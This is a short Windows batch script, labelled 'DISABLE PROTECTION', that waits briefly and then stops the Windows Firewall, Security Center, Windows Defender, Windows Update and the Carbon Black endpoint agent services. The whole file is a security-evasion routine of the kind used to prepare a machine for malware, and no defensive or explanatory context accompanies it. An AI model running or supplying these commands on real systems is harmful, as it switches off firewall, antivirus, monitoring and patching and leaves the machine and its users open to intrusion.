@ECHO OFF

ECHO ===========================================================================
ECHO DISABLE PROTECTION
ECHO Disable windows protection services.
ping -n 3 127.0.0.1 > NUL

net stop MpsSvc
net stop wscsvc
net stop WinDefend
net stop wuauserv
net stop carbonblack
